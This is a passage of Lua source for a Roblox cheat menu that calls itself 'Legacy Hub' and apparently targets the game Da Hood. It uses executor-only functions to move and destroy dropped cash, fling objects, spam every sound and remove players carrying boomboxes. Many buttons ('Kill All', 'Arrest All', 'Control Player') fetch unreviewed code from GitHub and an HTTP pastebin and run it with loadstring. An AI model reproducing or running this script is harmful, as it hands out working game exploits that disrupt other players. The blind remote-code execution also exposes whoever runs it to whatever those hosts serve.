					v.Anchored = false;
				end;
			end;
		end;
	end);
	local CashFloat = CashChannel:Button('Cash Float', function()
		spawn(function()
			repeat
				game:GetService("RunService").Heartbeat:wait()
				settings().Physics.AllowSleep = false
				settings().Physics.ThrottleAdjustTime = math.huge - math.huge
				setsimulationradius(1e9, 1e9)
				game:GetService("RunService").Stepped:wait()
			until nil
		end)
		local function zeroGrav(part)
			if part:FindFirstChild("BodyForce") then return end
			local temp = Instance.new("BodyForce")
			temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
			temp.Parent = part
		end

		for i,v in ipairs(workspace:GetDescendants()) do
			if v:IsA("Part") and v.Anchored == false then
				if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(v)
				end
			end
		end

		workspace.DescendantAdded:Connect(function(part)
			if part:IsA("Part") and part.Anchored == false then
				if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(part)
				end
			end
		end)
	end);
	local CashFloat = CashChannel:Button('Cash Float', function()
		spawn(function()
			repeat
				game:GetService("RunService").Heartbeat:wait()
				settings().Physics.AllowSleep = false
				settings().Physics.ThrottleAdjustTime = math.huge - math.huge
				setsimulationradius(1e9, 1e9)
				game:GetService("RunService").Stepped:wait()
			until nil
		end)
		local function zeroGrav(part)
			if part:FindFirstChild("BodyForce") then return end
			local temp = Instance.new("BodyForce")
			temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
			temp.Parent = part
		end

		for i,v in ipairs(workspace:GetDescendants()) do
			if v:IsA("Part") and v.Anchored == false then
				if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(v)
				end
			end
		end

		workspace.DescendantAdded:Connect(function(part)
			if part:IsA("Part") and part.Anchored == false then
				if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(part)
				end
			end
		end)
	end);
	local CashFling = CashChannel:Button('Cash Fling', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
			if v.Name == 'MoneyDrop' then
				local BodyPosition = Instance.new('BodyPosition', v);
				BodyPosition.D = 0;
				BodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
				BodyPosition.P = 15000;
			end;
		end;
	end);
	local CashDestroy = CashChannel:Button('Cash Destroy', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
			if v.Name == 'MoneyDrop' then
				v:Destroy();
			end;
		end;
	end);
	local CashSpin = CashChannel:Button('Cash Spin', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
			if v.Name == 'MoneyDrop' then
				local BodyPosition = Instance.new('BodyPosition');
				BodyPosition.Parent = v;
				local BodyAngularVelocity = Instance.new('BodyAngularVelocity');
				BodyAngularVelocity.Parent = v;
				BodyAngularVelocity.AngularVelocity = Vector3.new(0, 100, 0);
				BodyAngularVelocity.MaxTorque = Vector3.new(0, 200, 0);
			end;
		end;
	end);
	local CashGravity = CashChannel:Button('Cash Gravity', function()
		local function zeroGrav(part)
			if part:FindFirstChild("BodyForce") then return end
			local temp = Instance.new("BodyForce")
			temp.Force = part:GetMass() * Vector3.new(0,workspace.Gravity,0)
			temp.Parent = part
		end

		for i,v in ipairs(workspace:GetDescendants()) do
			if v:IsA("Part") and v.Anchored == false then
				if not (v:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(v)
				end
			end
		end

		workspace.DescendantAdded:Connect(function(part)
			if part:IsA("Part") and part.Anchored == false then
				if not (part:IsDescendantOf(game.Players.LocalPlayer.Character)) then
					zeroGrav(part)
				end
			end
		end)
	end);
	local CashAura = CashChannel:Button('Cash Aura', function()
		local plr = game.Players.LocalPlayer;
		local chr = plr.Character;
		local hum = chr.Humanoid;
		local mov = {};
		local mov2 = {};

		function ftp(str)
			local pt = {};
			if str ~= 'me' and str ~= 'random' then
				for i, v in pairs(game.Players:GetPlayers()) do
					if v.Name:lower():find(str:lower()) then
						table.insert(pt, v);
					end
				end
			elseif str == 'me' then
				table.insert(pt, plr);
			elseif str == 'random' then
				table.insert(pt, game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]);
			end
			return pt;
		end

		for _, v in pairs(workspace.Ignored.Drop:GetChildren()) do
			v.Anchored = false
			v.CanCollide = false
			local still = Instance.new('BodyAngularVelocity', v);
			still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
			still.AngularVelocity = Vector3.new(0, 0, 0);
			local align = Instance.new('AlignPosition', v);
			align.MaxForce = 1000000;
			align.MaxVelocity = math.huge;
			align.RigidityEnabled = false;
			align.ApplyAtCenterOfMass = true;
			align.Responsiveness = 200;
			local a0 = Instance.new('Attachment', v);
			local a1 = Instance.new('Attachment', chr.Head);
			align.Attachment0 = a0;
			align.Attachment1 = a1;
			table.insert(mov, a1);
			table.insert(mov2, still);
		end

		local par = {};
		for _, v in pairs(mov) do
			local parr = Instance.new('Part', workspace);
			parr.Anchored = true;
			parr.Size = Vector3.new(1, 1, 1);
			parr.Transparency = 1;
			parr.CanCollide = false;
			table.insert(par, parr);
		end

		local rotx = 0;
		local rotz = math.pi / 2;
		local height = 0;
		local heighti = 1;
		local offset = 10;
		local speed = 0.5;
		local mode = 4;
		local angular = Vector3.new(0, 0, 0);
		local l = 1;
		game['Run Service'].RenderStepped:Connect(function()
			rotx = rotx + speed / 100;
			rotz = rotz + speed / 100;
			l = (l >= 360 and 1 or l + speed);

			for i, v in pairs(par) do
				v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0);
			end

			if heighti == 1 then
				height = height + speed / 100;
			elseif heighti == 2 then
				height = height - speed / 100;
			end
			if height > 2 then
				heighti = 2;
			end
			if height < -1 then
				heighti = 1;
			end

			if mode == 1 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * offset, 0, math.sin(rotz) * offset);
				end
			elseif mode == 2 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(offset, height, offset);
				end
			elseif mode == 3 then
				for _, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * offset, height, math.sin(rotz) * offset);
				end
			elseif mode == 4 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 5 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.cos(rotz) - i) * offset);
				end
			elseif mode == 6 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new((math.sin(rotx)) * offset, height, (math.tan(rotz) - i) * offset);
				end
			elseif mode == 7 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(math.cos(rotx * i) * offset, 0, math.cos(rotz * i) * offset);
				end
			elseif mode == 8 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(math.sin(rotx) * i * offset, 0, math.sin(rotz) * i * offset);
				end
			elseif mode == 9 then
				pcall(function()
					local so = nil;
					for k, b in pairs(chr:GetChildren()) do
						if b:IsA'Tool' then
							for h, j in pairs(b:GetDescendants()) do
								if j:IsA'Sound' then
									so = j;
								end
							end
						end
					end
					if so ~= nil then
						offset = so.PlaybackLoudness / 35;
						speed = so.PlaybackLoudness / 500;
						angular = Vector3.new(0, so.PlaybackLoudness / 75, 0);
					end
				end)
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 10 then
				offset = height * 15;
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			elseif mode == 11 then
				for i, v in pairs(mov) do
					v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(plr:GetMouse().Hit.p)).Z) + Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
				end
			end
			for _, v in pairs(mov2) do
				v.AngularVelocity = angular;
			end
		end)
		game.Players.LocalPlayer.Chatted:Connect(function(c)
			if c:split(' ')[1] == '.orbit' then
				for _, v in pairs(mov) do
					chr = ftp(c:split(' ')[2])[1].Character;
					v.Parent = ftp(c:split(' ')[2])[1].Character.HumanoidRootPart;
				end
			end
			if c:split(' ')[1] == '.speed' then
				speed = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.mode' then
				mode = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.offset' then
				offset = tonumber(c:split(' ')[2]);
			end
			if c:split(' ')[1] == '.angular' then
				angular = Vector3.new(tonumber(c:split(' ')[2]), tonumber(c:split(' ')[3]), tonumber(c:split(' ')[4]));
			end
		end)
	end);

	local RPGRide = FeaturedChannel:Button('RPG Ride', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20rocket%20ride.lua'))();
	end);
	local RPGControl = FeaturedChannel:Button('RPG Control', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20homing%20rocket%20MOUSE.lua'))();
	end);
	local BurgerGalaxy = FeaturedChannel:Button('Burger Galaxy', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20burger%20galaxy.lua'))();
	end);
	local BurgerShield = FeaturedChannel:Button('Burger Shield', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20burger%20shield.lua'))();
	end);
	local ChickenGalaxy = FeaturedChannel:Button('Chicken Galaxy', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20chickne%20galaxy.lua'))();
	end);
	local Galaxy = FeaturedChannel:Button('Galaxy', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20mixed%20galaxy.lua'))();
	end);
	local SuperTaser = FeaturedChannel:Button('Super Taser', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20taser%20lock%20but%20op.lua'))();
	end);
	local AutoControl = FeaturedChannel:Button('Auto Control Player', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/09kTZYABk0'))();
	end);
	local SelectControl = FeaturedChannel:Button('Select Control Player', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/3yzv5hWJTX'))();
	end);
	local SelectControl = FeaturedChannel:Button('Select Control Player', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/3yzv5hWJTX'))();
	end);
	local GodKiller = FeaturedChannel:Button('Kill Godmodded Players', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20godkiller.lua'))();
	end);
	local ModMenu = FeaturedChannel:Button('Fake Mod Menu', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/HInpdr1Zmu'))();
	end);
	local ItemSpammer = FeaturedChannel:Button('Item Spammer', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20item%20spammer.lua'))();
	end);
	local GrenadeGalaxy = FeaturedChannel:Button('Grenade Galaxy', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/2II8KYaSCu'))();
	end);
	local GrenadeMouse = FeaturedChannel:Button('Grenade Mouse', function()
		loadstring(game:HttpGet('http://bin.shortbin.eu:8080/raw/Bu7eXXcrGc'))();
	end);
	local KillAll = FeaturedChannel:Button('Kill All', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20kill%20all.lua'))();
	end);
	local ArrestAll = FeaturedChannel:Button('Arrest All', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20autoarrest.lua'))();
	end);
	local SuperReach = FeaturedChannel:Button('Super Tool Reach', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20melee%20reach.lua'))();
	end);
	local SuperGun = FeaturedChannel:Button('Super Gun', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20super%20gun%20script.lua'))();
	end);

	local Astronaut = AnimationsChannel:Button('Astronaut', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Bubbly = AnimationsChannel:Button('Bubbly', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Cartoony = AnimationsChannel:Button('Cartoony', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Elder = AnimationsChannel:Button('Elder', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Knight = AnimationsChannel:Button('Knight', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Levitation = AnimationsChannel:Button('Levitation', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Mage = AnimationsChannel:Button('Mage', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Ninja = AnimationsChannel:Button('Ninja', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Pirate = AnimationsChannel:Button('Pirate', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Robot = AnimationsChannel:Button('Robot', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Stylish = AnimationsChannel:Button('Stylish', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Superhero = AnimationsChannel:Button('Superhero', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Toy = AnimationsChannel:Button('Toy', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Vampire = AnimationsChannel:Button('Vampire', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Werewolf = AnimationsChannel:Button('Werewolf', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);
	local Zombie = AnimationsChannel:Button('Zombie', function()
		local Animate = game.Players.LocalPlayer.Character.Animate
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
		Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
	end);

	local PermaMute = ExtrasChannel:Button('Perma-Mute All Boomboxes', function()
		game:GetService('RunService').Heartbeat:Connect(function()
			pcall(function()
				for _, v in pairs(game:GetService('Players'):GetPlayers()) do
					if v.Character:FindFirstChild('UpperTorso'):FindFirstChild('BOOMBOXSOUND') then
						v:Destroy();
					end;
				end
			end);
		end);
	end);
	local PlaySounds = ExtrasChannel:Button('Play All Sounds (FE)', function()
		sounds = {}

		function getSounds(loc)
			if loc:IsA("Sound") then
				table.insert(sounds,loc)
			end
			for _,obj in pairs(loc:GetChildren()) do
				getSounds(obj)
			end
		end

		getSounds(game)

		game.DescendantAdded:connect(function(obj)
			if obj:IsA("Sound") then
				table.insert(sounds,obj)
			end
		end)

		while wait(0.2) do
			for _,sound in pairs(sounds) do
				pcall(function()
					sound:Play()
				end)
			end
		end
	end);
	local MaskSpam = ExtrasChannel:Button('Mask Spam', function()
		local notifSound = Instance.new("Sound",workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Mask Spam Remove it and put it", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
		gsPlayers = game:GetService("Players")
		gsWorkspace = game:GetService("Workspace")
		gsLighting = game:GetService("Lighting")
		gsReplicatedStorage = game:GetService("ReplicatedStorage")
		gsCoreGui = game:GetService("CoreGui")
		gsTween = game:GetService("TweenService")
		gsHttp = game:GetService("HttpService")

		LP = gsPlayers.LocalPlayer
		Mouse = LP:GetMouse()

		LP.Character.ChildAdded:Connect(function(b)
			wait(0)
			if b:IsA("Accessory") then b.Handle.Mesh:Destroy()
				b.Parent = gsWorkspace
			end
		end)
	end);
	local FlingAura = ExtrasChannel:Button('Fling Aura', function()
		if workspace:FindFirstChild("Core") then
			workspace.Core:Destroy()
		end
		local Core = Instance.new("Part")
		Core.Name = "Core"
		Core.Size = Vector3.new(0.05, 0.05, 0.05)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
		local savepos = game.Players.LocalPlayer.Character.UpperTorso.Position
		local lol = game.Workspace.Ignored.Shop["[Hockey Mask] - $60"]
		game.Players.LocalPlayer.Character:MoveTo(lol.Head.Position)
		wait(0.25)
		fireclickdetector(lol.ClickDetector,4)
		wait(0.25)
		if game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") then
			game.Players.LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Character
		end
		wait(.2)
		local notifSound = Instance.new("Sound",workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Please wait a few secs", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
		gsPlayers = game:GetService("Players")
		gsWorkspace = game:GetService("Workspace")
		gsLighting = game:GetService("Lighting")
		gsReplicatedStorage = game:GetService("ReplicatedStorage")
		gsCoreGui = game:GetService("CoreGui")
		gsTween = game:GetService("TweenService")
		gsHttp = game:GetService("HttpService")

		LP = gsPlayers.LocalPlayer
		Mouse = LP:GetMouse()

		LP.Character.ChildAdded:Connect(function(b)
			wait(0)
			if b:IsA("Accessory") then b.Handle.Mesh:Destroy()
				b.Parent = gsWorkspace
			end
		end)
		wait()
		game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-295.006, 90.151, -700.9000)
		wait(1)
		if game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") then
			game.Players.LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Character
		end
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
		game.Players.LocalPlayer.Character.Mask:Activate()
		wait(1)
